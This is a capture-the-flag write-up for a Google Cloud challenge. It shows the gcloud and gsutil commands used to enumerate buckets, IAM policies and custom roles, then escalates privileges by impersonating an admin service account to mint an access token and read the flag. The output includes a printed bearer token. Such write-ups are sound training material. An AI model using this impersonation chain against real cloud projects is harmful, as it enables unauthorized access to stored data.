# Cloud Storage

# Cloud Storage

### Description

Cloud Storage \[Misc]

Have you heard about this "cloud" thing that everyone is using? I think we can save a bunch of money by putting our cat photos there!

I have provided a service account key that you can use to authenticate and check that you can access the photos.

That service account shouldn't have access to anything other than the cat pictures, but this whole "eye aye em" thing is a bit confusing, so I'm not entirely sure!

We can't afford to have another data breach, so we need to be confident that our flags are secure before we make the switch.

&#x20;[lateral-replica-423406-n3-f892e5bfb33b.json](https://ctfd.uscybergames.com/files/f52f1b2363af0e38e2fb053fd6e42582/lateral-replica-423406-n3-f892e5bfb33b.json?token=eyJ1c2VyX2lkIjozMDg2LCJ0ZWFtX2lkIjpudWxsLCJmaWxlX2lkIjoyMzJ9.Zl4UkQ.iuhcmqn5bWxlx5-jOKapoTfjzQg)

### Solution

The json file seems to be related to Google Cloud storage:

```json
{
    "type": "service_account",
    "project_id": "lateral-replica-423406-n3",
    "private_key_id": "f892e5bfb33b5c946945b97c8827fe7fae7e00e5",
    "private_key": "-----BEGIN PRIVATE KEY----- ... -----END PRIVATE KEY-----\n",
    "client_email": "user-service-account@lateral-replica-423406-n3.iam.gserviceaccount.com",
    "client_id": "105437552107326132543",
    "auth_uri": "https://accounts.google.com/o/oauth2/auth",
    "token_uri": "https://oauth2.googleapis.com/token",
    "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
    "client_x509_cert_url": "https://www.googleapis.com/robot/v1/metadata/x509/user-service-account%40lateral-replica-423406-n3.iam.gserviceaccount.com",
    "universe_domain": "googleapis.com"
}
```

Using `gcloud` CLI load the key and authenticate for access:

```bash
└─$ gcloud auth activate-service-account --key-file=lateral-replica-423406-n3-f892e5bfb33b.json
Activated service account credentials for: [user-service-account@lateral-replica-423406-n3.iam.gserviceaccount.com]
```

List buckets:

```bash
└─$ gsutil ls -p lateral-replica-423406-n3
gs://uscg-2024-bgr-cat-pictures/
gs://uscg-2024-bgr-flags/
```

List files:

```bash
└─$ gsutil ls gs://uscg-2024-bgr-flags/
gs://uscg-2024-bgr-flags/flag.txt
```

We get access denied when trying to copy the flag...

```bash
└─$ gsutil cp gs://uscg-2024-bgr-flags/flag.txt flag.txt
Copying gs://uscg-2024-bgr-flags/flag.txt...
AccessDeniedException: 403 HttpError accessing <https://storage.googleapis.com/download/storage/v1/b/uscg-2024-bgr-flags/o/flag.txt?generation=1715758447583995&alt=media>: response: <{'content-type': 'text/html; charset=UTF-8', 'date': 'Mon, 03 Jun 2024 19:51:21 GMT', 'vary': 'Origin, X-Origin', 'x-guploader-uploadid': 'ABPtcPpkpsrkZLh1qmrHWOiNuz18R7F_uGZHasR114Ucb6a3nHz5HtUNPEk0Sp9Dj0ZRViSYtBg', 'expires': 'Mon, 03 Jun 2024 19:51:21 GMT', 'cache-control': 'private, max-age=0', 'content-length': '230', 'server': 'UploadServer', 'alt-svc': 'h3=":443"; ma=2592000,h3-29=":443"; ma=2592000', 'status': '403'}>, content <user-service-account@lateral-replica-423406-n3.iam.gserviceaccount.com does not have storage.objects.get access to the Google Cloud Storage object. Permission &#39;storage.objects.get&#39; denied on resource (or it may not exist).>
```

We do have access to the other bucket so something else is required to access flag.

```bash
└─$ gsutil cp gs://uscg-2024-bgr-cat-pictures/* .
Copying gs://uscg-2024-bgr-cat-pictures/chaojie-ni-k8yGbX-zhUU-unsplash.jpg...
Copying gs://uscg-2024-bgr-cat-pictures/iosif-chiriluta-7DW8QjFqXBQ-unsplash.jpg...
Copying gs://uscg-2024-bgr-cat-pictures/kevin-wang-EjFskayuR1A-unsplash.jpg...
Copying gs://uscg-2024-bgr-cat-pictures/maksim-koshkin-R4mnEysISeI-unsplash.jpg...
/ [4 files][ 11.9 MiB/ 11.9 MiB]  684.5 KiB/s
Operation completed over 4 objects/11.9 MiB.

└─$ ls -alh *.jpg
Permissions Size User  Date Modified Name
.rw-r--r--  5.9M woyag  3 Jun 15:54   chaojie-ni-k8yGbX-zhUU-unsplash.jpg
.rw-r--r--  1.3M woyag  3 Jun 15:54   iosif-chiriluta-7DW8QjFqXBQ-unsplash.jpg
.rw-r--r--  2.0M woyag  3 Jun 15:54   kevin-wang-EjFskayuR1A-unsplash.jpg
.rw-r--r--  3.3M woyag  3 Jun 15:54   maksim-koshkin-R4mnEysISeI-unsplash.jpg
```

Get `IAM` policy on bucket:

```bash
└─$ gsutil iam get gs://uscg-2024-bgr-flags/
{
  "bindings": [
    {
      "members": [
        "projectEditor:lateral-replica-423406-n3",
        "projectOwner:lateral-replica-423406-n3"
      ],
      "role": "roles/storage.legacyBucketOwner"
    },
    {
      "members": [
        "projectViewer:lateral-replica-423406-n3"
      ],
      "role": "roles/storage.legacyBucketReader"
    },
    {
      "members": [
        "projectEditor:lateral-replica-423406-n3",
        "projectOwner:lateral-replica-423406-n3"
      ],
      "role": "roles/storage.legacyObjectOwner"
    },
    {
      "members": [
        "projectViewer:lateral-replica-423406-n3"
      ],
      "role": "roles/storage.legacyObjectReader"
    },
    {
      "members": [
        "serviceAccount:admin-service-account@lateral-replica-423406-n3.iam.gserviceaccount.com"
      ],
      "role": "roles/storage.objectViewer"
    }
  ],
  "etag": "CAI="
}
```

The only diff seems to be viewer role:![Cloud Storage](/assets/ctf/uscybergames/cloud_storage.png)

::: info :information_source:
Note: Left is `flag` bucket, right is `cat-pictures` bucket IAM policy
:::

Get accounts:

```bash
└─$ gcloud iam service-accounts list --project=lateral-replica-423406-n3
DISPLAY NAME           EMAIL                                                                    DISABLED
admin-service-account  admin-service-account@lateral-replica-423406-n3.iam.gserviceaccount.com  False
user-service-account   user-service-account@lateral-replica-423406-n3.iam.gserviceaccount.com   False
```

List roles:

```bash
└─$ gcloud iam roles list --project=lateral-replica-423406-n3
---
etag: BwYYef-3SNU=
name: projects/lateral-replica-423406-n3/roles/impersonate_admin
title: impersonate_admin
---
description: users can do some things!
etag: BwYYekyQ090=
name: projects/lateral-replica-423406-n3/roles/user_account_permissions
title: user_account_permissions
```

Describe roles:

```bash
└─$ gcloud iam roles describe impersonate_admin --project=lateral-replica-423406-n3 --verbosity=debug
DEBUG: Running [gcloud.iam.roles.describe] with arguments: [--project: "lateral-replica-423406-n3", --verbosity: "debug", ROLE_ID: "impersonate_admin"]
DEBUG: Starting new HTTPS connection (1): iam.googleapis.com:443
DEBUG: https://iam.googleapis.com:443 "GET /v1/projects/lateral-replica-423406-n3/roles/impersonate_admin?alt=json HTTP/1.1" 200 None
DEBUG: Chosen display Format:default
INFO: Display format: "default"
etag: BwYYef-3SNU=
includedPermissions:
- iam.serviceAccounts.getAccessToken
name: projects/lateral-replica-423406-n3/roles/impersonate_admin
stage: ALPHA
title: impersonate_admin

└─$ gcloud iam roles describe user_account_permissions --project=lateral-replica-423406-n3 --verbosity=debug
DEBUG: Running [gcloud.iam.roles.describe] with arguments: [--project: "lateral-replica-423406-n3", --verbosity: "debug", ROLE_ID: "user_account_permissions"]
DEBUG: Starting new HTTPS connection (1): iam.googleapis.com:443
DEBUG: https://iam.googleapis.com:443 "GET /v1/projects/lateral-replica-423406-n3/roles/user_account_permissions?alt=json HTTP/1.1" 200 None
DEBUG: Chosen display Format:default
INFO: Display format: "default"
description: users can do some things!
etag: BwYYekyQ090=
includedPermissions:
- iam.roles.get
- iam.roles.list
- iam.serviceAccounts.getIamPolicy
- iam.serviceAccounts.list
- storage.buckets.get
- storage.buckets.getIamPolicy
- storage.buckets.list
- storage.objects.list
name: projects/lateral-replica-423406-n3/roles/user_account_permissions
stage: ALPHA
title: user_account_permissions
```

Impersonate the admin and get auth token:[https://cloud.hacktricks.xyz/pentesting-cloud/gcp-security/gcp-privilege-escalation/gcp-iam-privesc#iam.serviceaccounts.getaccesstoken-iam.serviceaccounts.get](https://cloud.hacktricks.xyz/pentesting-cloud/gcp-security/gcp-privilege-escalation/gcp-iam-privesc#iam.serviceaccounts.getaccesstoken-iam.serviceaccounts.get)

```bash
└─$ gcloud auth print-access-token --impersonate-service-account='admin-service-account@lateral-replica-423406-n3.iam.gserviceaccount.com' --project=lateral-replica-423406-n3
WARNING: This command is using service account impersonation. All API calls will be executed as [admin-service-account@lateral-replica-423406-n3.iam.gserviceaccount.com].
ya29.c.c0AY_VpZi8maVDWeCFgZbkoAPb-D2Crn89fxPvGKB13zTWaREcT1akO0Jr4qY_5xmiDwbsi96umUb3Haba6OuQJ23awTvuXctdXtKJ6ZBW1kV5kX-pQFxaMVHzRfNQH1Ej4jvPc0zGUIL2RRoQTpv-RBO8KLu9fmzYb2yLTLKYmTDF1kH83xHllmwQW-BQRYBZKEiIbX7CrqDj2dXQy2xfDPvzR6CpVwcyPbXuVv8mcpgpfjS1-jD6IcH0vBYQgIe4gCTumXCv8x9Fs_PykLG9lMsiYm5CrFYlaNruAgY8H_Y4c67j9Kmjgkg4Pyu32TjZgHWVn2gxxW4GQG-rTvKo9AbEekFI0KPQclceGyTgDIVLs9Iku8-TrcvoAvU-fc3LzdM5Pf4PFsjEmfgjIOSmArHd4n7HQnINCQk2psxh00yhkKicCclHJmRIwdKR1e8uFO6dqH1Qcsr1HoZT0ipRg8O0DcBAl9BPJEKY10jvpGzqeMJYn3tjEtOObzgpytq_x7k772Qbt9z1446j1JWMl-USwGU7PODN1sMizgQ2z43Bjln2julQlX5xNN7Xr2EKLE_MLakG53h55FCFymSkFctKdcox7UvTfRC6cITmycmZrvvnogN635AQi8FgovxcSpMBIsyg8246zitie1u3f8mXcmqabWW4_vVMQqUlXRc7_-8otZcp8mO5VeBig2e9uSyIX8UyBUhY_l0Wtode1uSal3oR_8VQ7IM4IXo61WUvbvbn9-rf_bjB44av3St6xQa9pzB112ZW6R3t_vYRUM8M8Jjus29OicStnheOmIRrxOfyln4XQQW8YSSrgUU-zSyq7_SwosatSVt1o_yf677xcp-9_JQcZgi9WeobvIcOsVlg9UfIyvw8cV_nae6Wlw6Fg0bqyvuBYBVzxUVgduefggI88Z9teYeImaw9RuFOUip7mwxjUsc8JUZ08Qd68X0kuVtQomQ5qmomuip6Q5_aMWs9reea5fSYWvnljB_z-aXbgn3j_Zl

└─$ ADMIN='admin-service-account@lateral-replica-423406-n3.iam.gserviceaccount.com'
└─$ ACCESS_TOKEN=$(gcloud auth print-access-token --impersonate-service-account="$ADMIN" --project=lateral-replica-423406-n3)
└─$ curl -H "Authorization: Bearer $ACCESS_TOKEN" 'https://storage.googleapis.com/storage/v1/b/uscg-2024-bgr-flags/o/flag.txt?alt=media'
SIVBGR{7h3_51nc3r357_f0rm_0f_fl4773ry}
```

::: info :information_source:
Note: The file url came from `gsutil cat gs://uscg-2024-bgr-flags/flag.txt` command as it shows resource it tried to access!
:::

::: tip Flag
`**SIVBGR{7h3\_51nc3r357\_f0rm\_0f\_fl4773ry}**`
:::

***

Resources used:

* [RhinoSecurityLabs: Introduction to GCP Privilege Escalation](https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/) (PS: Script didn't work because it needs some manager which doesn't exist on this cloud)
* [Penetration testing skills: Cloud attack related to cloud security](https://www.ddosi.org/cloud-attack/#iamserviceAccountsgetAccessToken) (PS: Plug URL into Google Translate to read in different language 👀)
* [GCP - Services](https://cloud.hacktricks.xyz/pentesting-cloud/gcp-security/gcp-services) (PS: "GCP - IAM, Principals & Org Policies Enum" to be specific)

PPS: This challenge was more discovery rather goto solution, first time encounter with gcloud platform CTF. Do be fun, but commands do be messed up in order D:
